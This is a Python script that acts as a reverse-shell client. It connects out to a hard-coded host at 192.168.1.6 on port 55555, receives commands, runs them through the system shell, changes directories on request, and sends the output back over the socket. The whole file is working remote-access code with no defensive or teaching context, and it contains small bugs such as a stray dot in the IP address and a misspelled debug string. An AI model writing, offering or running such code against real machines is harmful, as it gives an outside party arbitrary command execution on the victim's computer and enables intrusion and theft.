import threading
import socket
import subprocess
import os
import regex as re
import json

port=55555
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(("192.168.1.6.",port))
print("Connected")

def reliable_send(message,client):
    json_message=json.dumps(message)
    client.send(json_message.encode('ascii'))

def reliable_recv(client):
    message=""
    while True:
        try:
            message=message+client.recv(1024).decode('ascii')
            return json.loads(message)
        except ValueError:
            print("Value Error")
            continue


            

def receive():
    while True:
        try:
            message=reliable_recv(client)
            #message=client.recv(1024).decode("ascii")
            print(message)
            if message=="LOC":
                message=(os.getcwd()+":")
                reliable_send(message,client)
                #client.send(message.encode('ascii'))
            elif message=="exit":
                client.close()
                print("Close")
            elif re.search("cd",message):
                message=message.replace("cd ","")
                os.chdir(message)
                message=(os.getcwd()+":")
                reliable_send(message,client)
                #client.send(message.encode('ascii'))
            else:
                print("esle")
                message=subprocess.run(message,shell=True,capture_output=True,text=True)
                if message.stdout:
                    print(message.stdout)
                    reliable_send(message.stdout,client)
                    #client.send(message.stdout.encode('ascii'))
                else:
                    reliable_send(message.stdout,client)
                    #client.send("Error".stdout.encode('ascii'))

        except:
            print("Error")
            client.close()
            break


receive_thread=threading.Thread(target=receive)
receive_thread.start()

